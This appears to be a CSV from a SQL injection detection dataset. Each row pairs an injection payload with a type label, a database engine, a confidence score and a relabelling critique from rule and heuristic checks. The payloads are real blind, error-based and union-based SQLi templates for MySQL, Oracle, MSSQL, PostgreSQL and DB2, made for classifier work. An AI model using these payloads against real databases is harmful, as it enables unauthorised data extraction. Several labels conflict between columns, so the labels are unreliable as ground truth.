id,payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,payload_inner,wrapper_detected,strip_depth,a_type,a_db,a_signals,c_type,c_db,c_signals
40213,"select * from users WHERE username = ""-2783%\' ) ) or username = ""1\'+ ( select onzd where 8452 = 8452 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\'""",error_based,postgresql,0.9,cast numeric conversion,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"-2783%\' ) ) or username = ""1\'+ ( select onzd where 8452 = 8452 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\'",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
40214,"select * from users WHERE username = ""-8163 ) ) as cvai where 2360 = 2360 and username = ""-1254"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""",error_based,postgresql,0.9,cast numeric conversion,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"-8163 ) ) as cvai where 2360 = 2360 and username = ""-1254"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
40215,"select * from users WHERE username = ""-5863"" or username = ""1%\' ) ) and ( ( \'%\' = \'"" or username = ""1 ) ) )",error_based,generic,0.85,wildcard pattern,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""-5863"" or username = ""1%\' ) ) and ( ( \'%\' = \'"" or username = ""1 ) ) )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
40216,"select * from users WHERE username = ""-6190\' ) where 2621 = 2621 or username = ""1 and username = ""-7430\' ) as xfah where 1596 = 1596",error_based,generic,0.85,subquery pattern,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""-6190\' ) where 2621 = 2621 or username = ""1 and username = ""-7430\' ) as xfah where 1596 = 1596",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
40217,"select * from users WHERE username = ""-4582 ) ) as gvfo where 8885 = 8885 and username = ""-2783%\' ) ) and username = ""-6190\' ) where 2621 = 2621 or username = ""-1254""",error_based,oracle,0.95,select from dual xmltype error,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"-4582 ) ) as gvfo where 8885 = 8885 and username = ""-2783%\' ) ) and username = ""-6190\' ) where 2621 = 2621 or username = ""-1254",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
40218,"select * from users WHERE username = ""-8069\' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'qbvz\' = \'qbvz"" and username = ""1\' )",error_based,postgresql,0.9,cast numeric conversion,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""-8069\' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'qbvz\' = \'qbvz"" and username = ""1\' )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
40219,"AND ELT([RANDNUM]=[RANDNUM],[RANDNUM1]) AND ELT([INFERENCE],[RANDNUM])",boolean_blind,mysql,0.9,ELT MySQL function,RELABEL,reasoning too short (18 chars),boolean_blind,mysql,"AND ELT([RANDNUM]=[RANDNUM],[RANDNUM1]) AND ELT([INFERENCE],[RANDNUM])",False,0,boolean_blind,mysql,Pattern match: 'elt(' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)"
40220,"OR ELT([RANDNUM]=[RANDNUM],[RANDNUM1]) OR ELT([INFERENCE],[RANDNUM])",boolean_blind,mysql,0.9,ELT MySQL function,RELABEL,reasoning too short (18 chars),boolean_blind,mysql,"OR ELT([RANDNUM]=[RANDNUM],[RANDNUM1]) OR ELT([INFERENCE],[RANDNUM])",False,0,boolean_blind,mysql,Pattern match: 'elt(' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)"
40221,"AND EXTRACTVALUE([RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 0x3A END) AND EXTRACTVALUE([RANDNUM],CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE 0x3A END)",boolean_blind,mysql,0.9,EXTRACTVALUE MySQL,RELABEL,reasoning too short (18 chars),boolean_blind,mysql,"AND EXTRACTVALUE([RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 0x3A END) AND EXTRACTVALUE([RANDNUM],CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE 0x3A END)",False,0,error_based,mysql,Pattern match: 'extractvalue(' → error_based (P4); DB signature: mysql,error_based,mysql,error function 'extractvalue(' detected
40222,"AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL AND (SELECT (CASE WHEN ([INFERENCE]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL",boolean_blind,oracle,0.9,CTXSYS Oracle blind,RELABEL,reasoning too short (19 chars),boolean_blind,oracle,"AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL AND (SELECT (CASE WHEN ([INFERENCE]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL",False,0,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected
40223,"OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL OR (SELECT (CASE WHEN ([INFERENCE]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL",boolean_blind,oracle,0.9,CTXSYS Oracle blind,RELABEL,reasoning too short (19 chars),boolean_blind,oracle,"OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL OR (SELECT (CASE WHEN ([INFERENCE]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL",False,0,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected
40224,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END)) (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END)),boolean_blind,generic,0.9,UNION SELECT blind,RELABEL,reasoning too short (18 chars),boolean_blind,generic,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END)) (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END)),False,0,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
40225,"MAKE_SET([RANDNUM]=[RANDNUM],[RANDNUM1]) MAKE_SET([INFERENCE],[RANDNUM])",boolean_blind,mysql,0.9,MAKE_SET MySQL,RELABEL,reasoning too short (14 chars),boolean_blind,mysql,"MAKE_SET([RANDNUM]=[RANDNUM],[RANDNUM1]) MAKE_SET([INFERENCE],[RANDNUM])",False,0,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check
40226,"MAKE_SET([RANDNUM]=[RANDNUM],[ORIGVALUE]) MAKE_SET([INFERENCE],[ORIGVALUE])",boolean_blind,mysql,0.9,MAKE_SET MySQL,RELABEL,reasoning too short (14 chars),boolean_blind,mysql,"MAKE_SET([RANDNUM]=[RANDNUM],[ORIGVALUE]) MAKE_SET([INFERENCE],[ORIGVALUE])",False,0,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check
40227,"ELT([RANDNUM]=[RANDNUM],[RANDNUM1]) ELT([INFERENCE],[RANDNUM])",boolean_blind,mysql,0.9,ELT MySQL function,RELABEL,reasoning too short (18 chars),boolean_blind,mysql,"ELT([RANDNUM]=[RANDNUM],[RANDNUM1]) ELT([INFERENCE],[RANDNUM])",False,0,boolean_blind,mysql,Pattern match: 'elt(' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)"
40228,"ELT([RANDNUM]=[RANDNUM],[ORIGVALUE]) ELT([INFERENCE],[ORIGVALUE])",boolean_blind,mysql,0.9,ELT MySQL function,RELABEL,reasoning too short (18 chars),boolean_blind,mysql,"ELT([RANDNUM]=[RANDNUM],[ORIGVALUE]) ELT([INFERENCE],[ORIGVALUE])",False,0,boolean_blind,mysql,Pattern match: 'elt(' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)"
40229,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)) (SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)),boolean_blind,generic,0.9,UNION ALL blind,RELABEL,reasoning too short (15 chars),boolean_blind,generic,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)) (SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)),False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
40230,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)) (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)),boolean_blind,generic,0.9,UNION ALL blind,RELABEL,reasoning too short (15 chars),boolean_blind,generic,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)) (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)),False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
40231,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL) (SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL),boolean_blind,oracle,0.9,CAST divide Oracle,RELABEL,reasoning too short (18 chars),boolean_blind,oracle,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL) (SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL),False,0,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
40232,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL) (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL),boolean_blind,oracle,0.9,CAST divide Oracle,RELABEL,reasoning too short (18 chars),boolean_blind,oracle,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL) (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL),False,0,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
40233,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM] END) FROM SYSMASTER:SYSDUAL) (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM] END) FROM SYSMASTER:SYSDUAL),boolean_blind,generic,0.9,division blind,RELABEL,reasoning too short (14 chars),boolean_blind,generic,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM] END) FROM SYSMASTER:SYSDUAL) (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM] END) FROM SYSMASTER:SYSDUAL),False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
40234,"IIF([RANDNUM]=[RANDNUM],[RANDNUM],1/0) IIF([INFERENCE],[RANDNUM],1/0)",boolean_blind,mssql,0.9,IIF MSSQL function,RELABEL,reasoning too short (18 chars),boolean_blind,mssql,"IIF([RANDNUM]=[RANDNUM],[RANDNUM],1/0) IIF([INFERENCE],[RANDNUM],1/0)",False,0,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check
40235,"IIF([RANDNUM]=[RANDNUM],[ORIGVALUE],1/0) IIF([INFERENCE],[ORIGVALUE],1/0)",boolean_blind,mssql,0.9,IIF MSSQL function,RELABEL,reasoning too short (18 chars),boolean_blind,mssql,"IIF([RANDNUM]=[RANDNUM],[ORIGVALUE],1/0) IIF([INFERENCE],[ORIGVALUE],1/0)",False,0,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check
40236,(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END) (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END),boolean_blind,generic,0.9,UNION SELECT blind,RELABEL,reasoning too short (18 chars),boolean_blind,generic,(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END) (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END),False,0,union_based,oracle,Pattern match: 'union select' → union_based (P7); DB signature: oracle,union_based,oracle,UNION SELECT structure
40237,(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END) (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END),boolean_blind,generic,0.9,UNION SELECT blind,RELABEL,reasoning too short (18 chars),boolean_blind,generic,(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END) (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END),False,0,union_based,oracle,Pattern match: 'union select' → union_based (P7); DB signature: oracle,union_based,oracle,UNION SELECT structure
40238,(CASE WHEN [RANDNUM]=[RANDNUM] THEN [RANDNUM] ELSE NULL END) (CASE WHEN [INFERENCE] THEN [RANDNUM] ELSE NULL END),boolean_blind,generic,0.9,CASE WHEN blind,RELABEL,reasoning too short (15 chars),boolean_blind,generic,(CASE WHEN [RANDNUM]=[RANDNUM] THEN [RANDNUM] ELSE NULL END) (CASE WHEN [INFERENCE] THEN [RANDNUM] ELSE NULL END),False,0,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check
40239,(CASE WHEN [RANDNUM]=[RANDNUM] THEN [ORIGVALUE] ELSE NULL END) (CASE WHEN [INFERENCE] THEN [ORIGVALUE] ELSE NULL END),boolean_blind,generic,0.9,CASE WHEN blind,RELABEL,reasoning too short (15 chars),boolean_blind,generic,(CASE WHEN [RANDNUM]=[RANDNUM] THEN [ORIGVALUE] ELSE NULL END) (CASE WHEN [INFERENCE] THEN [ORIGVALUE] ELSE NULL END),False,0,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check
40240,",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END)) ,(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))",boolean_blind,generic,0.9,division blind,RELABEL,reasoning too short (14 chars),boolean_blind,generic,",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END)) ,(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
40241,",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)) ,(SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))",boolean_blind,generic,0.9,UNION ALL blind,RELABEL,reasoning too short (15 chars),boolean_blind,generic,",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)) ,(SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
40242,",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)) ,(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))",boolean_blind,generic,0.9,UNION ALL blind,RELABEL,reasoning too short (15 chars),boolean_blind,generic,",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)) ,(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
40243,",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL) ,(SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)",boolean_blind,oracle,0.9,CAST divide Oracle,RELABEL,reasoning too short (18 chars),boolean_blind,oracle,",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL) ,(SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)",False,0,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
40244,",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL) ,(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)",boolean_blind,oracle,0.9,CAST divide Oracle,RELABEL,reasoning too short (18 chars),boolean_blind,oracle,",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL) ,(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)",False,0,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
40245,",IIF([RANDNUM]=[RANDNUM],1,1/0) ,IIF([INFERENCE],1,1/0)",boolean_blind,mssql,0.9,IIF MSSQL function,RELABEL,reasoning too short (18 chars),boolean_blind,mssql,",IIF([RANDNUM]=[RANDNUM],1,1/0) ,IIF([INFERENCE],1,1/0)",False,0,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check
40246,",IIF([RANDNUM]=[RANDNUM],[ORIGVALUE],1/0) ,IIF([INFERENCE],[ORIGVALUE],1/0)",boolean_blind,mssql,0.9,IIF MSSQL function,RELABEL,reasoning too short (18 chars),boolean_blind,mssql,",IIF([RANDNUM]=[RANDNUM],[ORIGVALUE],1/0) ,IIF([INFERENCE],[ORIGVALUE],1/0)",False,0,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check
40247,",(CASE WHEN [RANDNUM]=[RANDNUM] THEN 1 ELSE NULL END) ,(CASE WHEN [INFERENCE] THEN 1 ELSE NULL END)",boolean_blind,generic,0.9,CASE WHEN blind,RELABEL,reasoning too short (15 chars),boolean_blind,generic,",(CASE WHEN [RANDNUM]=[RANDNUM] THEN 1 ELSE NULL END) ,(CASE WHEN [INFERENCE] THEN 1 ELSE NULL END)",False,0,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check
40248,",(CASE WHEN [RANDNUM]=[RANDNUM] THEN [ORIGVALUE] ELSE NULL END) ,(CASE WHEN [INFERENCE] THEN [ORIGVALUE] ELSE NULL END)",boolean_blind,generic,0.9,CASE WHEN blind,RELABEL,reasoning too short (15 chars),boolean_blind,generic,",(CASE WHEN [RANDNUM]=[RANDNUM] THEN [ORIGVALUE] ELSE NULL END) ,(CASE WHEN [INFERENCE] THEN [ORIGVALUE] ELSE NULL END)",False,0,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check
40249,",(SELECT CASE WHEN [RANDNUM]=[RANDNUM] THEN 1 ELSE RAISE_ERROR(70001, '[RANDSTR]') END FROM SYSIBM.SYSDUMMY1) ,(SELECT CASE WHEN [INFERENCE] THEN 1 ELSE RAISE_ERROR(70001, '[RANDSTR]') END FROM SYSIBM.SYSDUMMY1)",boolean_blind,db2,0.9,RAISE_ERROR DB2,RELABEL,reasoning too short (15 chars),boolean_blind,db2,",(SELECT CASE WHEN [RANDNUM]=[RANDNUM] THEN 1 ELSE RAISE_ERROR(70001, '[RANDSTR]') END FROM SYSIBM.SYSDUMMY1) ,(SELECT CASE WHEN [INFERENCE] THEN 1 ELSE RAISE_ERROR(70001, '[RANDSTR]') END FROM SYSIBM.SYSDUMMY1)",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
40250,",(SELECT CASE WHEN [RANDNUM]=[RANDNUM] THEN [ORIGVALUE] ELSE RAISE_ERROR(70001, '[RANDSTR]') END FROM SYSIBM.SYSDUMMY1) ,(SELECT CASE WHEN [INFERENCE] THEN [ORIGVALUE] ELSE RAISE_ERROR(70001, '[RANDSTR]') END FROM SYSIBM.SYSDUMMY1)",boolean_blind,db2,0.9,RAISE_ERROR DB2,RELABEL,reasoning too short (15 chars),boolean_blind,db2,",(SELECT CASE WHEN [RANDNUM]=[RANDNUM] THEN [ORIGVALUE] ELSE RAISE_ERROR(70001, '[RANDSTR]') END FROM SYSIBM.SYSDUMMY1) ,(SELECT CASE WHEN [INFERENCE] THEN [ORIGVALUE] ELSE RAISE_ERROR(70001, '[RANDSTR]') END FROM SYSIBM.SYSDUMMY1)",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
40251,HAVING [RANDNUM]=[RANDNUM] HAVING [INFERENCE],boolean_blind,generic,0.9,HAVING blind,RELABEL,reasoning too short (12 chars),boolean_blind,generic,HAVING [RANDNUM]=[RANDNUM] HAVING [INFERENCE],False,0,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check
